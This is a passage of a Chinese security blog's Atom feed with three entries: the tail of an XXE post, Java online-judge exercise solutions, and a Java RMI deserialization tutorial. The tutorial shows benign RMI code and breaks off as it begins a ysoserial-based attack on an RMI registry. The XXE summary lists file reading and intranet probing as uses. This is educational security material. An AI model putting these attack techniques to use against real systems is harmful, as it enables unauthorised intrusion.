rel="noopener">https://www.secpulse.com/archives/58915.html</a> </li><li><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a> </li><li><a href="https://www.jianshu.com/p/7325b2ef8fc9" target="_blank" rel="noopener">https://www.jianshu.com/p/7325b2ef8fc9</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot; title=&quot;XXE&quot;&gt;&lt;/a&gt;XXE&lt;/h1&gt;&lt;p&gt;本来从来没想过记录这些基础漏洞的使用方法，但这个XXE老是临到用时就忘记，就记一记吧。危害一般都是读文件、内网端口探测、攻击内网网站
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>OJ刷题记录</title>
    <link href="http://bai-ren-1.github.io/2020/07/27/OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://bai-ren-1.github.io/2020/07/27/OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-27T12:54:58.000Z</published>
    <updated>2020-07-27T13:22:18.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OJ刷题记录"><a href="#OJ刷题记录" class="headerlink" title="OJ刷题记录"></a>OJ刷题记录</h1><p>菜，刷。两个字。大部分题目放在本地的IDEA中了，这里只是贴上一些老是忘记的点。</p><h2 id="0x00-华为OJ"><a href="#0x00-华为OJ" class="headerlink" title="0x00 华为OJ"></a>0x00 华为OJ</h2><h3 id="1-计算字符串个数"><a href="#1-计算字符串个数" class="headerlink" title="1. 计算字符串个数"></a>1. 计算字符串个数</h3><h4 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h4><p>这题难度标注是较难，个人感觉应该是标错了或者有更优解。不过搞安全的，这里不去探究最优解了，AC即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">题目描述</span></span><br><span class="line"><span class="comment">写出一个程序，接受一个由字母和数字组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:</span></span><br><span class="line"><span class="comment">第一行输入一个有字母和数字以及空格组成的字符串，第二行输入一个字符。</span></span><br><span class="line"><span class="comment">输出描述:</span></span><br><span class="line"><span class="comment">输出输入字符串中含有该字符的个数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入:</span></span><br><span class="line"><span class="comment">ABCDEF</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">输出:1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> NumOfAlpha;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String string = scanner.nextLine();</span><br><span class="line">        String alpha = scanner.nextLine();</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:string.toCharArray())&#123;</span><br><span class="line">            String str;</span><br><span class="line">            str = Character.toString(ch);</span><br><span class="line">            <span class="keyword">if</span>(str.equalsIgnoreCase(alpha))&#123;      <span class="comment">// 比较两个String不能直接用==进行判断，需要使用equals方法</span></span><br><span class="line">                result++;                         <span class="comment">// 必须使用equalsIgnoreCase才能通过，直接equals不行</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点"><a href="#题目坑点" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li><strong>String类型</strong>比较不同对象内容是否相同，应该用equals。因为==用于比较引用类型和比较基本数据类型时具有不同的功能。 </li><li>equalsIgnoreCase() ：用于将字符串与指定的对象比较，<strong>不考虑大小写</strong>。</li><li>for(char ch:string.toCharArray())：常用于<strong>String转Char数组并遍历</strong>。</li></ul><h3 id="2-输出逆序的字符串"><a href="#2-输出逆序的字符串" class="headerlink" title="2. 输出逆序的字符串"></a>2. 输出逆序的字符串</h3><h4 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h4><p>标注简单，主要是记录老是要忘的字符串和字符之间的转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">将一个字符串str的内容颠倒过来，并输出。str的长度不超过100个字符。</span></span><br><span class="line"><span class="comment">如：输入“I am a student”，输出“tneduts a ma I”。</span></span><br><span class="line"><span class="comment">输入参数：inputString：输入的字符串</span></span><br><span class="line"><span class="comment">返回值：输出转换好的逆序字符串</span></span><br><span class="line"><span class="comment">输入描述：输入一个字符串，可以有空格</span></span><br><span class="line"><span class="comment">输出描述：输出逆序的字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：I am a student</span></span><br><span class="line"><span class="comment">输出：tneduts a ma I</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> Easy.ReverseString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String string = scanner.nextLine();</span><br><span class="line">        <span class="keyword">int</span> num = string.length();</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();  <span class="comment">// 用来将字符拼接成字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            Character word = string.charAt(num-<span class="number">1</span>-i);</span><br><span class="line">            stringBuilder.append(word);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(stringBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-1"><a href="#题目坑点-1" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>StringBuilder类似Python中的数组的方法来实现<strong>把字符添加在一个结构</strong>。</li><li>StringBuilder使用<strong>toString</strong>实现添加在一起的字符转为字符串。</li><li>charAt实现<strong>字符串提取某个字符</strong>。</li></ul><h3 id="3-最小公倍数"><a href="#3-最小公倍数" class="headerlink" title="3. 最小公倍数"></a>3. 最小公倍数</h3><h4 id="题目概述-2"><a href="#题目概述-2" class="headerlink" title="题目概述"></a>题目概述</h4><p>经典，没啥好解释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">题目描述</span></span><br><span class="line"><span class="comment">正整数A和正整数B 的最小公倍数是指 能被A和B整除的最小的正整数值，设计一个算法，求输入A和B的最小公倍数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:</span></span><br><span class="line"><span class="comment">输入两个正整数A和B。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出描述:</span></span><br><span class="line"><span class="comment">输出A和B的最小公倍数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：5 7</span></span><br><span class="line"><span class="comment">输出：35</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> Easy.TheMinimumMultiple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="keyword">int</span> a = scanner.nextInt();</span><br><span class="line">            <span class="keyword">int</span> b = scanner.nextInt();</span><br><span class="line">            <span class="keyword">int</span> maximumConventions = MaximumConventions(a,b);</span><br><span class="line">            System.out.println(a*b/maximumConventions);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">MaximumConventions</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a &lt; b)&#123;  <span class="comment">// 保证被除数大于除数</span></span><br><span class="line">            <span class="keyword">int</span> temp = a;</span><br><span class="line">            a = b;</span><br><span class="line">            b = temp;</span><br><span class="line">        &#125;<span class="keyword">while</span>(a % b != <span class="number">0</span>)&#123;     <span class="comment">// 除法余数不为0则循环</span></span><br><span class="line">            n = a % b;</span><br><span class="line">            a = b;      <span class="comment">// 大数改小数</span></span><br><span class="line">            b = n;      <span class="comment">// 小数改更小</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;       <span class="comment">// 最后返回小的数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-2"><a href="#题目坑点-2" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>记住<strong>辗转相除法</strong>的返回值是小的数而非余数。</li><li>记住计算最小公倍数的公式。</li></ul><h3 id="4-漂亮度"><a href="#4-漂亮度" class="headerlink" title="4. 漂亮度"></a>4. 漂亮度</h3><h4 id="题目概述-3"><a href="#题目概述-3" class="headerlink" title="题目概述"></a>题目概述</h4><p>挺有意思的，思路就是统计字母个数，最多个数的占最大漂亮度然后依此类推。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">给出一个名字，该名字有26个字符串组成，定义这个字符串的“漂亮度”是其所有字母“漂亮度”的总和。</span></span><br><span class="line"><span class="comment">每个字母都有一个“漂亮度”，范围在1到26之间。没有任何两个字母拥有相同的“漂亮度”。字母忽略大小写。</span></span><br><span class="line"><span class="comment">给出多个名字，计算每个名字最大可能的“漂亮度”。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:整数N，后续N个名字</span></span><br><span class="line"><span class="comment">输出描述:每个名称可能的最大漂亮程度</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">zhangsan</span></span><br><span class="line"><span class="comment">lisi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">192</span></span><br><span class="line"><span class="comment">101</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> Normal.Beauty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> num = scanner.nextInt();</span><br><span class="line">        String[] names = <span class="keyword">new</span> String[num];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            Scanner scanner1 = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            names[i] = scanner1.nextLine();</span><br><span class="line">            <span class="comment">// System.out.println(names[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            beauty(names[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beauty</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; hm = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch:name.toCharArray())&#123;</span><br><span class="line">            <span class="keyword">if</span>(hm.containsKey(ch))&#123;</span><br><span class="line">                hm.put(ch,hm.get(ch)+<span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                hm.put(ch,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collection&lt;Integer&gt; coll = hm.values();</span><br><span class="line">        List&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(coll);</span><br><span class="line">        Collections.sort(nums);     <span class="comment">// 对所有的出现次数进行排序</span></span><br><span class="line">        <span class="keyword">int</span> N=<span class="number">26</span>;   <span class="comment">// 每个字母漂亮度</span></span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;  <span class="comment">// 每个名字总漂亮度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=nums.size()-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            sum+=N*nums.get(i);     <span class="comment">// 取最后一个元素即次数最多的字母</span></span><br><span class="line">            N--;    <span class="comment">// 次多的字母漂亮度一次递减</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-3"><a href="#题目坑点-3" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>以前都写的其他语言没使用过HashMap，类似于Python的<strong>字典</strong>，注意实例化的方法。</li><li>containsKey：判断HashMap中是否存在索引。</li><li>put：往HashMap中传入键值对。</li><li>get：通过索引获取其对应得值。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OJ刷题记录&quot;&gt;&lt;a href=&quot;#OJ刷题记录&quot; class=&quot;headerlink&quot; title=&quot;OJ刷题记录&quot;&gt;&lt;/a&gt;OJ刷题记录&lt;/h1&gt;&lt;p&gt;菜，刷。两个字。大部分题目放在本地的IDEA中了，这里只是贴上一些老是忘记的点。&lt;/p&gt;
&lt;h2 id=&quot;0
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>反序列化之RMI</title>
    <link href="http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/"/>
    <id>http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</id>
    <published>2020-07-25T01:53:51.000Z</published>
    <updated>2020-07-26T03:37:01.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化之RMI"><a href="#反序列化之RMI" class="headerlink" title="反序列化之RMI"></a>反序列化之RMI</h1><p>前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个R如何做到还得继续学习。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p> JAVA本身提供了一种<strong>RPC框架RMI</strong>及Java 远程方法调用，可以在不同的Java 虚拟机之间进行对象间的通讯 。 RMI是基于<strong>JRMP协议</strong>实现的。下面是RMI的调用逻辑： </p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/1.png" alt></p><p>由上图可以看出RMI主要分为三部分：</p><ul><li>RMI Registry注册中心</li><li>RMI Client 客户端</li><li>RMI Server服务端</li></ul><h2 id="0x01-初探"><a href="#0x01-初探" class="headerlink" title="0x01 初探"></a>0x01 初探</h2><blockquote><p>虽然这里RMI的三部分都是在本机上执行的，但是得理解好Remote表现在哪个地方。这里就直接贴代码，个人运行环境是JDK1.7.80版本。</p></blockquote><p>首先我们先看下普通利用RMI的每个部分的代码是怎么编写的以及其目录结构：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/6.png" alt></p><blockquote><p>这里定义了四个类和一个接口，从上到下分别代表着客户端、注册类、注册类接口、服务端和注册中心。</p></blockquote><h3 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h3><p>注册中心启动类Registry：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>远程接口HelloInterface：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程接口实现类HelloImpl用来绑定到注册中心上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端启动类HelloServer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端启动类HelloClient：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line">            System.out.println(hello.sayHello(&quot;flag&quot;));</span><br><span class="line">        &#125; catch (NotBoundException | RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>按照执行注册中心 -&gt; 执行服务端 -&gt; 执行客户端顺序执行，可以看到以下的结果：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/2.png" alt></p><p>服务端打印出了字符串”Hello from flag”，我们看客户端执行的结果：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/3.png" alt></p><p>可见客户端执行了sayHello方法，打印出了方法中的字符串。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>这里用自己的的话做一下过程描述：</p><ul><li>注册中心的代码通过<strong>createRegistry</strong>在1099端口开启了注册中心。</li><li>服务端定义了一个要绑定到注册中心的实现类HelloImpl。</li><li>服务端的代码通过getRegistry获取注册中心。</li><li>服务端的代码通过<strong>bind</strong>将实现类绑定到注册中心为hello。</li><li>客户端的代码通过getRegistry获取注册中心。</li><li>客户端的代码通过<strong>lookup</strong>找到注册中心上绑定为hello的类然后调用sayHello。</li></ul><blockquote><p>客户调用sayHello为什么是在客户端上执行？客户端只是获取了一个返回结果？</p><p>这个就是一个重点：RMI服务端提供的方法，<strong>被调用的时候该方法是执行在服务端</strong> 。</p></blockquote><h2 id="0x02-打法"><a href="#0x02-打法" class="headerlink" title="0x02 打法"></a>0x02 打法</h2><p>介绍完RMI的调用过程，主要还是为这个篇章做好铺垫，实现在这个RMI调用过程来攻击远程机器？下面代码因为我没搭建依赖环境，还是按照CC链分析的博客把ysoserial-master-30099844c6-1作为依赖库引入。</p><h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/7.png" alt></p><blockquote><p>这种攻击方式可以只涉及服务端和注册中心，所以这里只实现了这两个类而没有客户端类。</p></blockquote><p>服务端代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 